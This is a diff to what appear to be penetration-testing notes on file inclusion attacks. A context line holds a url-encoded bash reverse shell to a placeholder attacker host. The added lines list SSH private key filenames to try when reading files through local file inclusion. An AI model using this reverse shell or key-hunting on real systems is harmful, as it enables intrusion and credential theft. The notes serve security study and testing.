@@ -24,6 +24,14 @@ Which could be url-encoded as it contains special characters:
 bash%20-c%20%22bash%20-i%20%3E&%20/dev/tcp/$ATTACKER_IP/$ATTACKER_PORT%200%3E&1
 ```
 
+
+When looking for private keys with LFI, remember to try all typical key formats:
+
+* `id_rsa`
+* `id_ed25519`
+* `id_ecdsa` 
+
+
 ## RFI
 
 RFI happens if we are able to refer a file on our attackbox which will be executed.
